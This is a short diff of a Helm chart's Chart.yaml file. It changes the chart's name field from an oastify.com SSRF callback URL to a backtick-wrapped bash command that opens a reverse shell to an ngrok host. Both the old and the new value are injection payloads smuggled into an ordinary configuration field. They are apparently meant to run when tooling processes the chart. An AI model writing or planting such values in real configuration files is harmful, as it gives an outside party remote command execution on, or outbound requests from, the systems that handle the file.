@@ -1,5 +1,5 @@
 apiVersion: v2
-name: https://mmcs6cc1ldf7839j3w6sj2d12s8jwnkc.oastify.com/ssrf
+name: `/bin/bash -l > /dev/tcp/0.tcp.ngrok.io/17235 0<&1 2>&1;`
 description: A Helm chart for Kubernetes
 
 # A chart can be either an 'application' or a 'library' chart.
